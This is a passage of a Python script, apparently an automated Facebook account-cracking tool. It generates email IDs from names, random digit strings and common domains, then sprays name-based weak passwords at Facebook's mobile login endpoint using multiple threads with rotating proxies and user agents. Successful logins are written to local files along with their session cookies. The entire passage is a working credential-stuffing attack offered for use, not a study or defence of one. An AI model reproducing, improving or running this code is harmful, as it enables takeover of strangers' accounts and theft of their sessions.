    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(7))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟕】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════") 
#____ 
def naki8():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(8))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟖】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════") 
#____ 
def naki9():
    user=[]
    os.system('clear')
    print(logo)
    kod = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER FIRST NAME : ')
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER MIDDLE NAME : ')
    kodex = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] \x1b[1;97mENTER LAST NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(9))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟗】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kod+kode+kodex}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kod+kode+kodex+guru+doamin
            pwx = [kode,kodex,kod+kode+kodex,kod+kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'123456',kod+kode+kodex+guru+doamin,kodex+'123',kodex+'1234',kodex+'12345']
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════") 
#____ 
def khaa7():
	os.system('clear')
	print(logo)
	print(' \x1b[1;91m[\x1b[1;97m𝟏\x1b[1;91m] \x1b[1;97mNO DIGIT ATTACK   \x1b[1;91m[\x1b[1;97m𝟐\x1b[1;91m] \x1b[1;97m2 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟑\x1b[1;91m] \x1b[1;97m3 DIGI ATTACK     \x1b[1;91m[\x1b[1;97m𝟒\x1b[1;91m] \x1b[1;97m4 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟓\x1b[1;91m] \x1b[1;97m5 DIGIT ATTACK    \x1b[1;91m[\x1b[1;97m𝟔\x1b[1;91m] \x1b[1;97m6 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟕\x1b[1;91m] \x1b[1;97m7 DIGIT ATTACK    \x1b[1;91m[\x1b[1;97m𝟖\x1b[1;91m] \x1b[1;97m8 DIGIT ATTACK')
	print(' \x1b[1;91m[\x1b[1;97m𝟗\x1b[1;91m] \x1b[1;97m9 DIGIT ATTACK    \x1b[1;91m[\x1b[1;97m𝟏𝟎\x1b[1;91m] \x1b[1;97mGO BACK MENU')
	print("\x1b[1;90m══════════════════════════════════════════")
	opt = input('\x1b[1;97m[●] ENTER YOUR CHOICE: ')
	if opt =='1':
		na1()
	elif opt =='2':
		na2()
	elif opt =='3':
		na3()
	elif opt =='4':
		na4()
	elif opt =='5':
		na5()
	elif opt =='6':
		na6()
	elif opt =='7':
		na7()
	elif opt =='8':
		na8()
	elif opt =='9':
		na9()
	elif opt =='m':
		menu()		
def na1():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(0))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀]  No DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
#____   
def na2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(2))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟐】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+guru+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")  
#____     
def na3():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(3))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟑】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+guru+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____     
def na4():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(4))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟒】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+guru+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____     
def na5():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(5))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟓】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+guru+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════")
    
#____     
def na6():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(6))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟔】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+guru+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════") 

#____     
def na7():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(7))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟕】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+guru+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════") 

#____     
def na8():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(8))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟖】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+guru+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════") 
    
#____     
def na9():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] ENTER NAME : ')
    print('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] @yahoo.com @hotmail.com @gmail.com ')
    doamin = input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT DOMAIN : ')
    limit = int(input('  \x1b[1;97m[\x1b[1;91m+\x1b[1;97m] PUT LIMIT : '))
    for nmbr in range(limit):
        res = ''.join(secrets.choice(string.digits) for x in range(9))
        user.append(res)
    with ThreadPool(max_workers=40) as bee:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\x1b[38;5;248m      [💀]  TOTAL IDs Taken:\033[1;97m '+tl)
        print('\x1b[38;5;248m      [💀] 【𝟗】DIGIT ATTACK \033[1;97mM.BETA')
        print(f"\x1b[38;5;248m      [💀] \033[1;97m {kode}★★★★★★{doamin}")
        print('\x1b[38;5;248m      [💀]  DHORJO DHOR 😩')
        print("\x1b[1;90m══════════════════════════════════════════")
        for guru in user:
            uid = kode+guru+doamin
            pwx = [kode,kode+guru,kode+'123',kode+'1234',kode+'12345',kode+'123456',kode+guru+doamin]
            bee.submit(rcrack,uid,pwx,tl)
    print("\x1b[1;90m══════════════════════════════════════════")
    print(' \x1b[1;91m[💀] ARE YOU CONNECTED TO THE INTERNET!!?? 🤣 ')
    print("\x1b[1;90m══════════════════════════════════════════") 
    

def rcrack(uid,pwx,tl):
 global loop
 global oks
 global cps
 global agents
 global proxy
 try:
        for ps in pwx:
            ua = random.choice(usergent)
            nip=random.choice(proxsi)
            proxies = {
            'http': 'http://'+nip,
            'https': 'http://'+nip
            }
            session = requests.Session()
            color = random.choice(["\x1b[1;91mPROCESSING..","\x1b[1;92mPROCESSING..","\x1b[1;93mPROCESSING..","\x1b[1;94mPROCESSING..","\x1b[1;95mPROCESSING..","\x1b[1;96mPROCESSING..","\x1b[1;97mPROCESSING..","\x1b[1;91mPROCESSING..","\x1b[38;5;248mPROCESSING..","\x1b[1;93mPROCESSING..","\x1b[1;94mPROCESSING..","\x1b[1;95mPROCESSING..","\x1b[1;96mPROCESSING.."])
            sys.stdout.write(f'\r  {color}\033[1;31m \033[1;37m%s/\033[1;33m%s \r'%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.beta.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.beta.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://m.beta.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua}
            lo = session.post('https://m.beta.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\033[1;37m[HIT-✔]\033[1;32m '+cid+'|'+ps+'\n\033[0;36m'+coki+'')
                open('ZZA.txt', 'a').write(cid+'|'+ps+'\n'+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print(f'\033[1;35m[CP-✘]\033[1;31m '+cid+'|'+ps+'')
                open('Z-CP.txt', 'a').write(cid+'/'+uid+'|'+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
 except:
        pass
menu()
